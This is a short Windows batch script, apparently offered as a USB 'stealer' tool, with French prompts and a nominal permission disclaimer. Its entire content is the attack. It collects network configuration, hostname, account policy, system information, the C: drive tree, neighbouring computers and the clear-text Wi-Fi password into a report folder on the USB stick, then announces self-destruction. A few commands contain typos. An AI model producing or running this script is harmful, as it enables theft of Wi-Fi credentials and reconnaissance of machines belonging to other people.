[autorun]
@echo off
cls
color a
Title Ste@ler
echo ©Sitylist94, All Rights Reserved
 set /p nouvelle_variable="Entrer la lettre de votre cle usb : "
cd %nouvelle_variable%:\
md Report
set /p wifipassword="Entrer le nom du wifi auquel vous etes connecte : "
cls
echo Je ne porte pas responsable de vos actes , utilisez ce programme seuleument sur un pc dont vous aves les droits.
echo Cliquez sur [ENTRER] pour demarrer le logiciel.
pause >nul
echo Travaille en cours...
ipconfig >%nouvelle_variable%:\Report\ipconfig.txt
echo -IP: OK
ipconfig\all >%nouvelle_variable%:\Report\ipconfigall.txt
echo -all ips: OK
hostname >%nouvelle_variable%:\Report\hostname.txt
echo -hostname: OK
netsh wlan show profile name=%wifipassword% key=clear >%nouvelle_variable%:\Report\wifipassword.txt
echo -wifi password: OK
net accounts >%nouvelle_variable%:\Report/netaccounts.txt
echo -windows accounts: OK
ver >%nouvelle_variable%:\Report\versionwindows.txt
echo -version of windows: OK
systeminfo >%nouvelle_variable%:\Report\systeminfo.txt
echo -system information: OK 
tree C: >%nouvelle_varible%:\Report\treeC.txt
echo -organization folder: OK
net view >%nouvelle_variable%:\Report\netview.txt
echo -computer on the network: OK
cls
echo Attendez 5 secondes , le programme va s'auto-detruire


   
